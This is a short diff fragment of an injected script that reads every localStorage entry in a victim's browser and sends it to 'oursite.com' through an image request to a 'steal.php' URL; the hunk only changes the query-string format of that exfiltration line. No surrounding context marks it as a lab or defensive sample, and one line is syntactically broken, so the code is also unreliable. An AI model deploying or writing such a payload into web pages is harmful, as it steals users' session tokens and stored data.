@@ -15,5 +15,5 @@
     stor += key = ": " + localStorage.getItem(key)) + "\n";
     i++;
   }
-  img.src="http://oursite.com?steal.php" + stor;
+  img.src="http://oursite.com?steal.php?c=" + stor;
 </script>
